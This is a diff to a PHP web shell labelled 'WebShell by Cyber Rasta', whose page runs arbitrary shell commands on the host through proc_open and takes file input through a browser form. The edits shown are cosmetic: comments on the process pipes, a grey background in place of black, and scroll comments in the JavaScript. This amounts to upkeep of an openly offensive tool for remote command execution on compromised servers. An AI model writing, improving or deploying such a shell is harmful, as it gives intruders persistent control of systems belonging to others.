@@ -13,9 +13,9 @@ if (!isset($_SESSION['authenticated'])) {
 
 function executeCommand($command) {
     $descriptorspec = array(
-       0 => array("pipe", "r"), 
-       1 => array("pipe", "w"),
-       2 => array("pipe", "w")
+       0 => array("pipe", "r"),  // stdin
+       1 => array("pipe", "w"),  // stdout
+       2 => array("pipe", "w")   // stderr
     );
 
     $process = proc_open($command, $descriptorspec, $pipes, realpath('./'), array());
@@ -67,10 +67,10 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear') {
 <head>
     <title>WebShell by Cyber Rasta</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; }
+        body { background-color: #3f3f3f; color: #0f0; font-family: monospace; }
         form { margin: 0; }
-        input[type=text], input[type=file] { background-color: #000; color: #0f0; border: none; width: 90%; font-size: 1.2em; padding: 10px; margin: 10px 0; }
-        input[type=submit] { background-color: #000; color: #0f0; border: none; font-size: 1.2em; padding: 10px; margin: 10px 0; cursor: pointer; }
+        input[type=text], input[type=file] { background-color: #3f3f3f; color: #0f0; border: none; width: 90%; font-size: 1.2em; padding: 10px; margin: 10px 0; }
+        input[type=submit] { background-color: #3f3f3f; color: #0f0; border: none; font-size: 1.2em; padding: 10px; margin: 10px 0; cursor: pointer; }
         #output { margin: 10px 0; padding: 10px; background-color: #111; overflow-y: auto; max-height: 500px; }
     </style>
 </head>
@@ -100,7 +100,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear') {
                     var output = document.getElementById('output');
                     var command = document.getElementById('commandInput').value;
                     output.innerHTML += xhr.responseText;
-                    output.scrollTop = output.scrollHeight;
+                    output.scrollTop = output.scrollHeight;  // Scroll to bottom
                     document.getElementById('commandInput').value = '';
                 }
             };
@@ -131,7 +131,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear') {
                 if (xhr.readyState === 4 && xhr.status === 200) {
                     var output = document.getElementById('output');
                     output.innerHTML += xhr.responseText;
-                    output.scrollTop = output.scrollHeight;
+                    output.scrollTop = output.scrollHeight;  // Scroll to bottom
                     document.getElementById('fileInput').value = '';
                 }
             };
